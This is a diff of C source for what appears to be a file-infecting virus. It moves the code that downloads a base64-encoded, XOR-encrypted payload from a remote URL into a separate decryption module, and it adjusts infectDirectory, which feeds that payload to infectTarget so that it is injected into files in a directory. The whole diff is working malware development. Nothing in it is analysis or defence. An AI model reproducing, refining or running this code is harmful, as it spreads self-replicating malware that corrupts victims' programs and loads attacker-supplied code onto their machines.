@@ -3,45 +3,9 @@
 #include <string.h>
 #include "common.h"
 #include "os.h"
-#include "web.h"
+#include "weakcrypt.h"
 #include "clonelib.h"
-#include "thirdparty/b64.h"
 
-
-unsigned int getRemoteBytes(char** decrypted_msg, const char* url){
-	//get encoded message
-	char* encoded_msg=getHypertext(url);
-	
-	//Decode message
-	char* decoded_msg;
-	unsigned int raw_msg_size=b64decode(&decoded_msg,encoded_msg);
-	
-	//Deallocate and allocate
-	free(encoded_msg);
-	*decrypted_msg=(char*)malloc(sizeof(char)*(raw_msg_size-XOR_KEY_SIZE));
-	char key[XOR_KEY_SIZE];
-
-	//Decrypt message
-	for(unsigned int i=0;i<raw_msg_size;i++){
-		if(i<XOR_KEY_SIZE){
-			key[i]=decoded_msg[i];
-		}else{
-			//XOR with key
-			(*decrypted_msg)[i-XOR_KEY_SIZE]=decoded_msg[i]^key[(i-XOR_KEY_SIZE)%XOR_KEY_SIZE];
-		}
-	}
-
-	//Perform one-byte Integrity check
-	if (*decrypted_msg[raw_msg_size-XOR_KEY_SIZE-1]!=(*decrypted_msg[0] ^ *decrypted_msg[raw_msg_size-XOR_KEY_SIZE-2]))
-		fprintf(stderr,"Error: getRemoteBytes: integrity check failed\n");
-	
-	//Deallocate memory
-	free(decoded_msg);
-	
-	
-	
-	return raw_msg_size-XOR_KEY_SIZE-1;
-}
 unsigned int getOwnBytes(char** bytes, const char* arg0){	
 	//Get name of executable
 	char* execname;
@@ -173,8 +137,9 @@ bool infectDirectory(const char* path, const char* arg0){
 						
 						//Copy code from external binary
 						char* bytes;
-						unsigned int bytes_size=getRemoteBytes(&bytes,remote_url);
-						printf("%d",infectTarget(ls[i],bytes,bytes_size));
+						int bytes_size=decryptRemoteBytes(&bytes,remote_url);
+						if(bytes_size>0)
+							printf("%d",infectTarget(ls[i],bytes,bytes_size));
 						free(bytes);
 						free(remote_url);
 					}
